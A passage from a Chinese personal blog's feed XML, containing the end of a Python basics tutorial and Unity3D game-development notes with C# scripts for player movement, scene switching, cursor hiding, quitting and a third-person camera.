class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">li = [<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>]</span><br><span class="line">li.append(<span class="number">4</span>)  <span class="comment"># 添加元素</span></span><br><span class="line">li.remove(<span class="number">2</span>)  <span class="comment"># 删除元素</span></span><br><span class="line">li.sort()     <span class="comment"># 排序</span></span><br></pre></td></tr></table></figure><h2 id="元组"><a href="#元组" class="headerlink" title="元组"></a>元组</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">t = (<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>)</span><br><span class="line"><span class="built_in">print</span>(t[<span class="number">2</span>])  <span class="comment"># 输出：3</span></span><br></pre></td></tr></table></figure><h2 id="字典"><a href="#字典" class="headerlink" title="字典"></a>字典</h2><h3 id="基本操作-1"><a href="#基本操作-1" class="headerlink" title="基本操作"></a>基本操作</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line">dic = &#123;<span class="string">&#x27;name&#x27;</span>:<span class="string">&#x27;my3171&#x27;</span>, <span class="string">&#x27;age&#x27;</span>:<span class="string">&#x27;18&#x27;</span>&#125;</span><br><span class="line"><span class="built_in">print</span>(dic[<span class="string">&#x27;age&#x27;</span>])  <span class="comment"># 输出：18</span></span><br><span class="line"></span><br><span class="line">dic[<span class="string">&#x27;tel&#x27;</span>] = <span class="string">&#x27;1333333&#x27;</span>  <span class="comment"># 添加元素</span></span><br><span class="line"><span class="keyword">del</span> dic[<span class="string">&#x27;tel&#x27;</span>]         <span class="comment"># 删除元素</span></span><br></pre></td></tr></table></figure><h3 id="字典方法"><a href="#字典方法" class="headerlink" title="字典方法"></a>字典方法</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(dic.keys())    <span class="comment"># 输出所有键</span></span><br><span class="line"><span class="built_in">print</span>(dic.values())  <span class="comment"># 输出所有值</span></span><br><span class="line"><span class="built_in">print</span>(dic.items())   <span class="comment"># 输出所有键值对</span></span><br></pre></td></tr></table></figure><h2 id="集合"><a href="#集合" class="headerlink" title="集合"></a>集合</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">s = &#123;<span class="number">1</span>, <span class="number">2</span>, <span class="number">3</span>, <span class="number">4</span>&#125;</span><br><span class="line">s.add(<span class="number">5</span>)       <span class="comment"># 添加元素</span></span><br><span class="line">s.remove(<span class="number">3</span>)    <span class="comment"># 删除元素</span></span><br><span class="line"><span class="built_in">print</span>(s &amp; &#123;<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>&#125;)  <span class="comment"># 交集，输出：&#123;4,5&#125;</span></span><br></pre></td></tr></table></figure><h2 id="类型转换"><a href="#类型转换" class="headerlink" title="类型转换"></a>类型转换</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">int</span>(<span class="string">&quot;123&quot;</span>))      <span class="comment"># 字符串转整数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">float</span>(<span class="number">123</span>))      <span class="comment"># 整数转浮点数</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">str</span>(<span class="number">123</span>))        <span class="comment"># 数字转字符串</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">list</span>(<span class="string">&quot;abc&quot;</span>))     <span class="comment"># 字符串转列表</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">tuple</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]))  <span class="comment"># 列表转元组</span></span><br></pre></td></tr></table></figure><h2 id="函数"><a href="#函数" class="headerlink" title="函数"></a>函数</h2><h3 id="基本函数"><a href="#基本函数" class="headerlink" title="基本函数"></a>基本函数</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">login</span>():</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;这是一个函数&quot;</span>)</span><br><span class="line">login()</span><br></pre></td></tr></table></figure><h3 id="参数类型"><a href="#参数类型" class="headerlink" title="参数类型"></a>参数类型</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment"># 必备参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">num1, num2</span>):</span><br><span class="line">    <span class="keyword">return</span> num1 + num2</span><br><span class="line"></span><br><span class="line"><span class="comment"># 默认参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">a=<span class="number">18</span></span>):</span><br><span class="line">    <span class="built_in">print</span>(a)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 可变参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">*args</span>):</span><br><span class="line">    <span class="built_in">print</span>(args)</span><br><span class="line"></span><br><span class="line"><span class="comment"># 关键字参数</span></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">func</span>(<span class="params">**kwargs</span>):</span><br><span class="line">    <span class="built_in">print</span>(kwargs)</span><br></pre></td></tr></table></figure><h3 id="闭包"><a href="#闭包" class="headerlink" title="闭包"></a>闭包</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">def</span> <span class="title function_">outer</span>():</span><br><span class="line">    a = <span class="number">5</span></span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">inner</span>():</span><br><span class="line">        <span class="keyword">nonlocal</span> a</span><br><span class="line">        a = <span class="number">20</span></span><br><span class="line">        <span class="built_in">print</span>(<span class="string">&quot;inner:&quot;</span>, a)</span><br><span class="line">    inner()</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;outer:&quot;</span>, a)</span><br><span class="line">outer()</span><br></pre></td></tr></table></figure><h2 id="内置函数"><a href="#内置函数" class="headerlink" title="内置函数"></a>内置函数</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="built_in">print</span>(<span class="built_in">abs</span>(-<span class="number">10</span>))       <span class="comment"># 绝对值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">len</span>(<span class="string">&quot;hello&quot;</span>))   <span class="comment"># 长度</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">max</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))     <span class="comment"># 最大值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">min</span>(<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>))     <span class="comment"># 最小值</span></span><br><span class="line"><span class="built_in">print</span>(<span class="built_in">sum</span>([<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>]))   <span class="comment"># 求和</span></span><br></pre></td></tr></table></figure><h2 id="文件操作"><a href="#文件操作" class="headerlink" title="文件操作"></a>文件操作</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;w&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    f.write(<span class="string">&quot;Hello World&quot;</span>)</span><br><span class="line"></span><br><span class="line"><span class="keyword">with</span> <span class="built_in">open</span>(<span class="string">&#x27;test.txt&#x27;</span>, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">    content = f.read()</span><br><span class="line">    <span class="built_in">print</span>(content)</span><br></pre></td></tr></table></figure><h2 id="异常处理"><a href="#异常处理" class="headerlink" title="异常处理"></a>异常处理</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">try</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="number">1</span>/<span class="number">0</span>)</span><br><span class="line"><span class="keyword">except</span> ZeroDivisionError:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;不能除以零&quot;</span>)</span><br><span class="line"><span class="keyword">finally</span>:</span><br><span class="line">    <span class="built_in">print</span>(<span class="string">&quot;执行完毕&quot;</span>)</span><br></pre></td></tr></table></figure><h2 id="面向对象"><a href="#面向对象" class="headerlink" title="面向对象"></a>面向对象</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">class</span> <span class="title class_">Person</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self, name, age</span>):</span><br><span class="line">        <span class="variable language_">self</span>.name = name</span><br><span class="line">        <span class="variable language_">self</span>.age = age</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">say_hello</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="built_in">print</span>(<span class="string">f&quot;你好，我是<span class="subst">&#123;self.name&#125;</span>&quot;</span>)</span><br><span class="line"></span><br><span class="line">p = Person(<span class="string">&quot;小明&quot;</span>, <span class="number">18</span>)</span><br><span class="line">p.say_hello()</span><br></pre></td></tr></table></figure><h2 id="模块导入"><a href="#模块导入" class="headerlink" title="模块导入"></a>模块导入</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> math</span><br><span class="line"><span class="built_in">print</span>(math.sqrt(<span class="number">16</span>))  <span class="comment"># 平方根</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> datetime <span class="keyword">import</span> datetime</span><br><span class="line"><span class="built_in">print</span>(datetime.now())  <span class="comment"># 当前时间</span></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> python </category>
          
      </categories>
      
      
        <tags>
            
            <tag> python </tag>
            
            <tag> 编程 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>unity3D游戏开发笔记（一）</title>
      <link href="/2025/02/10/unity3D%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/"/>
      <url>/2025/02/10/unity3D%E5%BC%80%E5%8F%91%E7%AC%94%E8%AE%B0/</url>
      
        <content type="html"><![CDATA[<h2 id="关于-ClianWorld-测试版使用脚本记录（一）"><a href="#关于-ClianWorld-测试版使用脚本记录（一）" class="headerlink" title="关于 ClianWorld 测试版使用脚本记录（一） :"></a>关于 ClianWorld 测试版使用脚本记录（一） :</h2><p><img src="https://pic1.imgdb.cn/item/67a9ad29d0e0a243d4fde3cb.png" style="zoom:5%;" /></p><h3 id="描述："><a href="#描述：" class="headerlink" title="描述："></a>描述：</h3><p>C联致力于开发的开放世界虚拟基地，基于unity游戏引擎，按照《次元永生》界海世界观进行打造。</p><p>同时，我们将继续进行游戏性的开发，探索更多的游戏模式以及可玩性，最终打造划时代的产品。</p><h3 id="记录："><a href="#记录：" class="headerlink" title="记录："></a>记录：</h3><h4 id="1-基于Character-Contorller的角色移动脚本（基础版）"><a href="#1-基于Character-Contorller的角色移动脚本（基础版）" class="headerlink" title="1.基于Character Contorller的角色移动脚本（基础版）"></a>1.基于Character Contorller的角色移动脚本（基础版）</h4><p>功能：实现游戏角色的前后移动和方向旋转</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">PlayerMovement</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> CharacterController controller;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> Speed = <span class="number">10f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> RotateSpeed = <span class="number">1f</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> Gravity = <span class="number">-9.8f</span>;</span><br><span class="line">    <span class="keyword">private</span> Vector3 Velocity = Vector3.zero;</span><br><span class="line">    <span class="keyword">public</span> Transform GroundCheck;</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> CheckRadius = <span class="number">0.2f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">bool</span> IsGround;</span><br><span class="line">    <span class="keyword">public</span> LayerMask layerMask;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> JumpHeight = <span class="number">3f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        controller = transform.GetComponent&lt;CharacterController&gt;();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        MoveLikeWow();</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">MoveLikeWow</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        IsGround = Physics.CheckSphere(GroundCheck.position, CheckRadius, layerMask);</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span>(IsGround &amp;&amp; Velocity.y&lt;<span class="number">0</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            Velocity.y = <span class="number">0</span>;</span><br><span class="line">        &#125;</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">var</span> horizontal = Input.GetAxis(<span class="string">&quot;Horizontal&quot;</span>);</span><br><span class="line">        <span class="keyword">var</span> vertical = Input.GetAxis(<span class="string">&quot;Vertical&quot;</span>);</span><br><span class="line"></span><br><span class="line">        <span class="keyword">var</span> move = transform.forward * Speed * vertical * Time.deltaTime;</span><br><span class="line">        controller.Move(move);</span><br><span class="line"></span><br><span class="line">        Velocity.y += Gravity + Time.deltaTime;</span><br><span class="line">        controller.Move(Velocity * Time.deltaTime);</span><br><span class="line"></span><br><span class="line">        transform.Rotate(Vector3.up, horizontal * RotateSpeed);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="2-全局场景跳转脚本（帮助界面为例）"><a href="#2-全局场景跳转脚本（帮助界面为例）" class="headerlink" title="2.全局场景跳转脚本（帮助界面为例）"></a>2.全局场景跳转脚本（帮助界面为例）</h4><p>功能：由一个场景(Scene)跳转到其他场景</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">Help</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// 菜单界面的场景名称</span></span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">string</span> menuSceneName = <span class="string">&quot;help&quot;</span>;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 检测是否按下H键</span></span><br><span class="line">        <span class="keyword">if</span> (Input.GetKeyDown(KeyCode.H))</span><br><span class="line">        &#123;</span><br><span class="line">            <span class="comment">// 加载帮助菜单场景</span></span><br><span class="line">            SceneManager.LoadScene(<span class="string">&quot;help&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="3-绑定按钮场景跳转脚本（开始菜单为例）"><a href="#3-绑定按钮场景跳转脚本（开始菜单为例）" class="headerlink" title="3.绑定按钮场景跳转脚本（开始菜单为例）"></a>3.绑定按钮场景跳转脚本（开始菜单为例）</h4><p>功能：通过绑定到按钮上，实现场景跳转</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.SceneManagement;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">FirstWorld</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">LoadGame</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        SceneManager.LoadScene(<span class="string">&quot;firstworld&quot;</span>);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="4-隐藏鼠标"><a href="#4-隐藏鼠标" class="headerlink" title="4.隐藏鼠标"></a>4.隐藏鼠标</h4><p>(修改参数可以控制鼠标指针是否显示)</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">killmouse</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="comment">// Start is called before the first frame update</span></span><br><span class="line">    <span class="function"><span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        Cursor.visible = <span class="literal">false</span>; <span class="comment">// 隐藏鼠标</span></span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure><h4 id="5-退出游戏（EXIT）"><a href="#5-退出游戏（EXIT）" class="headerlink" title="5.退出游戏（EXIT）"></a>5.退出游戏（EXIT）</h4><p>功能：绑定按钮，实现点击退出游戏</p><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ExitGameButton</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnExitButtonClick</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="comment">// 调用Application类的方法来退出游戏</span></span><br><span class="line">        Application.Quit();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h4 id="6-第三人称自由视角-镜头"><a href="#6-第三人称自由视角-镜头" class="headerlink" title="6.第三人称自由视角(镜头)"></a>6.第三人称自由视角(镜头)</h4><figure class="highlight c#"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">using</span> System.Collections;</span><br><span class="line"><span class="keyword">using</span> System.Collections.Generic;</span><br><span class="line"><span class="keyword">using</span> UnityEngine;</span><br><span class="line"><span class="keyword">using</span> UnityEngine.InputSystem;</span><br><span class="line"></span><br><span class="line"><span class="keyword">public</span> <span class="keyword">class</span> <span class="title">ThirdPersonCamera</span> : <span class="title">MonoBehaviour</span></span><br><span class="line">&#123;</span><br><span class="line">    <span class="keyword">private</span> GameObject _mainCamera;</span><br><span class="line">    [<span class="meta">Header(<span class="string">&quot;Cinemachine&quot;</span>)</span>]</span><br><span class="line">    [<span class="meta">Tooltip(<span class="string">&quot;跟随的目标&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> GameObject CameraTarget;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Tooltip(<span class="string">&quot;上移动的最大角度&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> TopClamp = <span class="number">70.0f</span>;</span><br><span class="line"></span><br><span class="line">    [<span class="meta">Tooltip(<span class="string">&quot;下移动的最大角度&quot;</span>)</span>]</span><br><span class="line">    <span class="keyword">public</span> <span class="built_in">float</span> BottomClamp = <span class="number">-30.0f</span>;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> <span class="keyword">const</span> <span class="built_in">float</span> _threshold = <span class="number">0.01f</span>;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetYaw;</span><br><span class="line">    <span class="keyword">private</span> <span class="built_in">float</span> _cinemachineTargetPitch;</span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Start</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_mainCamera == <span class="literal">null</span>)</span><br><span class="line">        &#123;</span><br><span class="line">            _mainCamera = GameObject.FindGameObjectWithTag(<span class="string">&quot;MainCamera&quot;</span>);</span><br><span class="line">        &#125;</span><br><span class="line">        _cinemachineTargetYaw = CameraTarget.transform.rotation.eulerAngles.y;</span><br><span class="line"></span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">Update</span>()</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (_look.sqrMagnitude &gt;= _threshold)</span><br><span class="line">        &#123;</span><br><span class="line">            _cinemachineTargetYaw += _look.x;</span><br><span class="line">            _cinemachineTargetPitch -= _look.y;</span><br><span class="line">        &#125;</span><br><span class="line">        _cinemachineTargetYaw = ClampAngle(_cinemachineTargetYaw, <span class="built_in">float</span>.MinValue, <span class="built_in">float</span>.MaxValue);</span><br><span class="line">        _cinemachineTargetPitch = ClampAngle(_cinemachineTargetPitch, BottomClamp, TopClamp);</span><br><span class="line">        CameraTarget.transform.rotation = Quaternion.Euler(_cinemachineTargetPitch, _cinemachineTargetYaw, <span class="number">0.0f</span>);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="function"><span class="keyword">private</span> <span class="keyword">static</span> <span class="built_in">float</span> <span class="title">ClampAngle</span>(<span class="params"><span class="built_in">float</span> lfAngle, <span class="built_in">float</span> lfMin, <span class="built_in">float</span> lfMax</span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        <span class="keyword">if</span> (lfAngle &lt; <span class="number">-360f</span>) lfAngle += <span class="number">360f</span>;</span><br><span class="line">        <span class="keyword">if</span> (lfAngle &gt; <span class="number">360f</span>) lfAngle -= <span class="number">360f</span>;</span><br><span class="line">        <span class="keyword">return</span> Mathf.Clamp(lfAngle, lfMin, lfMax);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="keyword">private</span> Vector2 _look;</span><br><span class="line">    <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">OnLook</span>(<span class="params">InputValue <span class="keyword">value</span></span>)</span></span><br><span class="line">    &#123;</span><br><span class="line">        _look = <span class="keyword">value</span>.Get&lt;Vector2&gt;();</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"></span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> unity </category>
          
      </categories>
      
      
        <tags>
            
            <tag> unity </tag>
            
            <tag> 游戏开发 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>关于M.Y</title>
      <link href="/2025/01/12/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/"/>
      <url>/2025/01/12/%E4%B8%AA%E4%BA%BA%E7%AE%80%E4%BB%8B/</url>
      
